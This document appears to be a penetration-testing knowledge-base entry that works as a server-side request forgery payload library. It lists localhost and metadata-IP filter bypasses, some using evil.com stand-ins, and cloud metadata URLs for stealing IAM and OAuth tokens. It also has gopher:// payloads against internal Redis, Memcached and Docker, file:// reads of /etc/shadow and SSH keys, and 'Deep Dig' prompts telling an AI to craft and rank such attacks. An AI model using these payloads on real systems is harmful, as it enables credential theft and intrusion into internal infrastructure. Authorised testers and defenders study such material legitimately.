---
id: "ssrf-payloads"
title: "SSRF Payload Library - Bypass Techniques & Internal Targets"
type: "payload"
category: "web-application"
subcategory: "ssrf"
tags: ["ssrf", "payload", "bypass", "localhost", "cloud-metadata", "gopher", "dns-rebinding", "deep-dig"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["ssrf-techniques", "cloud-misconfigurations"]
updated: "2026-03-30"
---

## Overview

SSRF payloads for bypassing filters, accessing internal services, and extracting cloud metadata. Organized by bypass technique and target service.

## Localhost Bypass Payloads

```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://0
http://127.1
http://127.0.1
http://2130706433        # Decimal for 127.0.0.1
http://0x7f000001        # Hex for 127.0.0.1
http://017700000001      # Octal for 127.0.0.1
http://[::1]             # IPv6 localhost
http://[0000::1]
http://[::ffff:127.0.0.1]
http://①②⑦.⓪.⓪.①       # Unicode
http://127.0.0.1.nip.io
http://localtest.me
http://spoofed.burpcollaborator.net  # DNS rebinding
http://0177.0.0.1        # Octal notation
http://0x7f.0x0.0x0.0x1  # Hex octets
http://127.0.0.1%00@evil.com  # Null byte
http://evil.com@127.0.0.1     # URL authority confusion
http://127.0.0.1#@evil.com    # Fragment confusion
```

## Cloud Metadata Endpoints

### AWS (IMDSv1)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### AWS (IMDSv2 - requires token)
```
# Step 1: Get token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
```

## 169.254.169.254 Filter Bypasses

```
http://2852039166                     # Decimal
http://0xa9fea9fe                     # Hex
http://0251.0376.0251.0376            # Octal
http://169.254.169.254.nip.io
http://[::ffff:169.254.169.254]       # IPv6
http://[::ffff:a9fe:a9fe]             # IPv6 hex
http://169.254.169.254%00.evil.com
http://169.254.169.254.xip.io
# DNS rebinding: set up DNS that alternates between safe IP and 169.254.169.254
```

## Internal Service Payloads

### Redis (via gopher://)
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a
```

### Memcached
```
gopher://127.0.0.1:11211/_stats%0d%0a
```

### Kubernetes API
```
http://10.0.0.1:443/api/v1/
https://kubernetes.default.svc/api/v1/secrets
http://10.0.0.1:10250/pods
```

### Docker Socket
```
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json
gopher://127.0.0.1:2375/_GET%20/containers/json%20HTTP/1.1%0d%0a%0d%0a
```

### Internal Web Services
```
http://127.0.0.1:8080        # Tomcat/Jenkins
http://127.0.0.1:8443        # Internal HTTPS
http://127.0.0.1:9200        # Elasticsearch
http://127.0.0.1:5601        # Kibana
http://127.0.0.1:3000        # Grafana
http://127.0.0.1:9090        # Prometheus
http://127.0.0.1:15672       # RabbitMQ Management
http://127.0.0.1:8500        # Consul
http://127.0.0.1:2379        # etcd
```

## Protocol Smuggling

### Gopher
```
# Generic gopher payload structure
gopher://TARGET:PORT/_PAYLOAD

# URL-encode the payload (replace newlines with %0d%0a)
# Double URL-encode if the application decodes once
```

### File Protocol
```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///home/user/.ssh/id_rsa
file:///var/log/apache2/access.log
```

### Dict Protocol
```
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats
```

## Deep Dig Prompts

```
Given this SSRF endpoint [describe]:
1. Provide 20 localhost bypass payloads sorted by likelihood of success.
2. Determine the cloud provider and suggest metadata extraction payloads.
3. Identify internal services to target based on common architectures.
4. Suggest DNS rebinding setup for persistent SSRF access.
5. Craft gopher:// payloads for internal Redis/Memcached exploitation.
```

## Tools

- **SSRFmap** — Automated SSRF exploitation
- **Gopherus** — Generate gopher:// payloads for various services
- **Interactsh** — Out-of-band interaction server
- **Burp Collaborator** — OOB detection
